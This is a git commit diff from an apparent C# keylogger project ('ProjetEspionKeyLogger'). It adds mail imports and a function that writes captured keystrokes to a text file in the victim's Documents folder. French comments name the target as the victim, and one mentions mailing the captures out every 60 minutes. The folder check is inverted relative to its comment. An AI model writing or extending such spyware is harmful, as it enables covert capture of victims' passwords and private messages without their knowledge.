776483c9693a8324199615519a0800ef6367aed7
Laura <Laura@DESKTOP-0MMVBKT>
2020-12-22 18:17:48 +0100

    Ajout de la fonction enregistreTxt

--- ProjetEspionKeyLogger/KeyLogger.cs
+++ ProjetEspionKeyLogger/KeyLogger.cs
@@ -5,11 +5,13 @@ using System.Windows.Forms;
 using System.Drawing;
 using System.IO;
 using System.Xml.Serialization;
+using System.Net;
+using System.Net.Mail;
 
 namespace ProjetEspionKeyLogger
 {
     class KeyLogger
-    {   //test lolo
+    {   
         //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
         private Enregistrement enregistrement_courrant;
         //Timer qui permet de gerer l'envoit des mails (toutes les 60 minutes)
@@ -54,6 +56,27 @@ namespace ProjetEspionKeyLogger
         private void enregistreTxt()
         {
 
+            //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
+            string chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+            //Si la victime n'a pas de dossier "mes documents" alors on en crée un
+            if (Directory.Exists(chemin_Dossier))
+            {
+                Directory.CreateDirectory(chemin_Dossier);
+            }
+
+            //Création du fichier texte
+            using (StreamWriter sw = File.CreateText(chemin_Dossier + @"\CaptureClavier.txt"))
+            {
+
+            }
+
+            //Ecriture
+            using (StreamWriter sw = File.AppendText(chemin_Dossier + @"\CaptureClavier.txt"))
+            {
+                sw.Write(texte);
+
+            }
         }
 
 
